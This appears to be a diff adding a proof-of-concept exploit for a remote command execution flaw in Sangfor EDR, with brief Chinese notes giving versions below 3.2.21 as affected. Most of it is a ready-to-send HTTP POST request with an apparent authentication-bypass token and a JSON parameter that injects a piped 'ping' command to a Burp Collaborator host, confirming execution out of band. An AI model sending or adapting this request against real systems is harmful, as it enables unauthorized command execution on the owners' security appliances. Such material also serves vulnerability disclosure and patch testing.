@@ -1,0 +1,18 @@
+POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
+Host: xx.xxx.xx.17:9443
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36
+Content-Length: 89
+Connection: close
+
+{"params": "w=1\"'test'\"|ping n5tcbkdcgf8hlj7xjc7578yau10soh.burpcollaborator.net"}
+
+漏洞信息:
+
+深信服EDR某处存在远程命令执行漏洞
+
+影响范围:
+
+<3.2.21
+
+
